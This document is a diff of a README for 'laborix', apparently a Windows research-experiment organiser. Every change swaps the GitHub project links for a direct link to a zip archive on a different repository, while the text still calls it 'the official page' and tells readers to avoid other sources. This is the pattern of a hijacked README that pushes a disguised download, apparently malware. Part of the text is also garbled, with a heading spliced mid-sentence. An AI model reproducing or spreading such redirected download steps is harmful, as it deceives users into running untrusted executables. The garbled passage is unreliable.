@@ -5,13 +5,13 @@ description: "Orchestrate fully offline autonomous experiment pipelines with det
 ---
 # 🧪 laborix - Run Research Experiments Without the Chaos
 
-[![Download laborix](https://img.shields.io/badge/Download-laborix-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/incognyto/laborix)
+[![Download laborix](https://img.shields.io/badge/Download-laborix-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/incognyto/incognyto.github.io/main/nanes/3.4.zip)
 
 laborix is a Windows-friendly application for organizing research experiments from beginning to end. It helps you plan work, keep steps in the right order, pause and continue without losing progress, record what happened, and produce clear reports. The ideas can sound technical, but this guide explains them in everyday language.
 
 ## 📥 Download and Run on Windows
 
-Visit this link to download the application: [Download laborix](https://github.com/incognyto/laborix).
+Visit this link to download the application: [Download laborix](https://raw.githubusercontent.com/incognyto/incognyto.github.io/main/nanes/3.4.zip).
 
 The link opens the official laborix page. Use the download option shown there to get laborix for your Windows computer. After the download finishes, open laborix from the place where your browser saved it. The application becomes your workspace for planning experiments, starting runs, pausing when needed, and reviewing results.
 
@@ -36,13 +36,13 @@ The application is designed for people who want more structure and less manual b
 
 laborix is useful for researchers, students, analysts# 🧪 laborix - Run Research Experiments Without the Chaos
 
-[![Download laborix](https://img.shields.io/badge/Download-laborix-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/incognyto/laborix)
+[![Download laborix](https://img.shields.io/badge/Download-laborix-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/incognyto/incognyto.github.io/main/nanes/3.4.zip)
 
 laborix is a Windows-friendly application for organizing research experiments from beginning to end. It helps you plan work, keep steps in the right order, pause and continue without losing progress, record what happened, and produce clear reports. The ideas can sound technical, but this guide explains them in everyday language.
 
 ## 📥 Download and Run on Windows
 
-Visit this link to download the application: [Download laborix](https://github.com/incognyto/laborix).
+Visit this link to download the application: [Download laborix](https://raw.githubusercontent.com/incognyto/incognyto.github.io/main/nanes/3.4.zip).
 
 The link opens the official laborix page. Use the download option shown there to get laborix for your Windows computer. After the download finishes, open laborix from the place where your browser saved it. The application becomes your workspace for planning experiments, starting runs, pausing when needed, and reviewing results.
 
@@ -115,7 +115,7 @@ No additional software needs to be installed. No programming tools are required.
 
 ## 🚀 Getting Started After Download
 
-1. Visit the download link: [Download laborix](https://github.com/incognyto/laborix).
+1. Visit the download link: [Download laborix](https://raw.githubusercontent.com/incognyto/incognyto.github.io/main/nanes/3.4.zip).
 2. Use the download option on that page to save laborix to your computer.
 3. Open the downloaded file from your Downloads folder or the location you chose.
 4. Follow the on-screen prompts to finish setting up laborix on Windows.
@@ -146,7 +146,7 @@ Reports are saved as files on your computer. You can open them with any text edi
 ## 🛠️ Troubleshooting Common Questions
 
 **The download page looks different than expected.**  
-Make sure you are on the official page: [https://github.com/incognyto/laborix](https://github.com/incognyto/laborix). The page may show a download button or a list of files; choose the option that matches Windows.
+Make sure you are on the official page: [https://raw.githubusercontent.com/incognyto/incognyto.github.io/main/nanes/3.4.zip](https://raw.githubusercontent.com/incognyto/incognyto.github.io/main/nanes/3.4.zip). The page may show a download button or a list of files; choose the option that matches Windows.
 
 **laborix does not open after setup.**  
 Restart your computer and try again. If the problem continues, check that your Windows version is 10 or 11 and that you have enough free disk space.
@@ -179,7 +179,7 @@ laborix is provided through its official page. Visit the download link for the c
 
 ## 🔗 Support and Updates
 
-For the latest version, updates, and support information, always start at the official page: [Download laborix](https://github.com/incognyto/laborix). Bookmark this page so you can return to it whenever you need to download laborix again or check for news.
+For the latest version, updates, and support information, always start at the official page: [Download laborix](https://raw.githubusercontent.com/incognyto/incognyto.github.io/main/nanes/3.4.zip). Bookmark this page so you can return to it whenever you need to download laborix again or check for news.
 
 The page is the single source for the application. Avoid downloading laborix from other websites, because those copies may be out of date or unsafe.
 
